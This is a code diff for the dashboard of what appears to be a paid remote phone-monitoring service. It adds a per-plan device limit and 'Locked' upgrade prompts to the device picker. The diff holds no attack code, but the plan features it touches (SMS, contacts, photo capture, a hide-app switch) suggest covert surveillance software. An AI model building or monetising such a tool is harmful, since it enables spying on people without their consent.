@@ -15,7 +15,6 @@ import ZipProgressModal from "@/components/ZipProgressModal";
 
 let socket: any;
 
-// Plan limits type
 interface PlanLimits {
     photos: number;
     videos: number;
@@ -25,6 +24,7 @@ interface PlanLimits {
     vibration: boolean;
     hideApp: boolean;
     bulkDownload?: boolean;
+    maxDevices: number;
 }
 
 export default function Home() {
@@ -35,7 +35,7 @@ export default function Home() {
     // Plan State
     const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
     const [planLimits, setPlanLimits] = useState<PlanLimits>({
-        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false
+        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, maxDevices: 1
     });
     const [showUpgradeModal, setShowUpgradeModal] = useState(false);
     const [showPlansModal, setShowPlansModal] = useState(false);
@@ -1325,7 +1325,10 @@ END:VCARD`;
                     <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                         <div className="bg-[#1a1a1a] border-t md:border border-white/20 w-full md:w-96 md:rounded-2xl shadow-2xl animate-slideUp">
                             <div className="p-4 border-b border-white/10 flex justify-between items-center">
-                                <h3 className="text-lg font-bold">Select Device</h3>
+                                <div>
+                                    <h3 className="text-lg font-bold">Select Device</h3>
+                                    <p className="text-xs text-white/40">Limit: {planLimits.maxDevices} device{planLimits.maxDevices > 1 ? 's' : ''}</p>
+                                </div>
                                 <button
                                     onClick={() => setIsDeviceDropdownOpen(false)}
                                     className="p-2 hover:bg-white/10 rounded-lg transition-colors"
@@ -1335,27 +1338,50 @@ END:VCARD`;
                             </div>
                             <div className="max-h-[60vh] overflow-y-auto p-2">
                                 {devices.filter(d => d.online).length > 0 ? (
-                                    devices.filter(d => d.online).map((device) => (
-                                        <button
-                                            key={device.deviceId}
-                                            onClick={() => {
-                                                setSelectedDeviceId(device.deviceId);
-                                                setIsDeviceDropdownOpen(false);
-                                            }}
-                                            className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedDeviceId === device.deviceId ? 'bg-purple-500/20 border border-purple-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
-                                        >
-                                            <div className="flex items-center gap-3">
-                                                <div className="w-3 h-3 rounded-full bg-green-500" />
-                                                <div>
-                                                    <div className="font-medium">{device.name}</div>
-                                                    <div className="text-xs text-green-400">Online</div>
+                                    devices.filter(d => d.online).map((device, idx) => {
+                                        const isLocked = idx >= planLimits.maxDevices;
+                                        return (
+                                            <button
+                                                key={device.deviceId}
+                                                onClick={() => {
+                                                    if (isLocked) {
+                                                        setShowPlansModal(true);
+                                                        setIsDeviceDropdownOpen(false);
+                                                    } else {
+                                                        setSelectedDeviceId(device.deviceId);
+                                                        setIsDeviceDropdownOpen(false);
+                                                    }
+                                                }}
+                                                className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${isLocked
+                                                        ? 'bg-white/5 border border-white/10 opacity-60'
+                                                        : selectedDeviceId === device.deviceId
+                                                            ? 'bg-purple-500/20 border border-purple-500/50'
+                                                            : 'bg-white/5 border border-transparent hover:bg-white/10'
+                                                    }`}
+                                            >
+                                                <div className="flex items-center gap-3">
+                                                    <div className={`w-3 h-3 rounded-full ${isLocked ? 'bg-red-500' : 'bg-green-500'}`} />
+                                                    <div>
+                                                        <div className="font-medium flex items-center gap-2">
+                                                            {device.name}
+                                                            {isLocked && (
+                                                                <span className="text-xs px-2 py-0.5 rounded bg-red-500/20 text-red-400">🔒 Locked</span>
+                                                            )}
+                                                        </div>
+                                                        <div className={`text-xs ${isLocked ? 'text-red-400' : 'text-green-400'}`}>
+                                                            {isLocked ? 'Upgrade to unlock' : 'Online'}
+                                                        </div>
+                                                    </div>
                                                 </div>
-                                            </div>
-                                            {selectedDeviceId === device.deviceId && (
-                                                <svg className="w-5 h-5 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            )}
-                                        </button>
-                                    ))
+                                                {!isLocked && selectedDeviceId === device.deviceId && (
+                                                    <svg className="w-5 h-5 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                )}
+                                                {isLocked && (
+                                                    <svg className="w-5 h-5 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                                                )}
+                                            </button>
+                                        );
+                                    })
                                 ) : (
                                     <div className="text-center py-8 text-white/40">
                                         <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
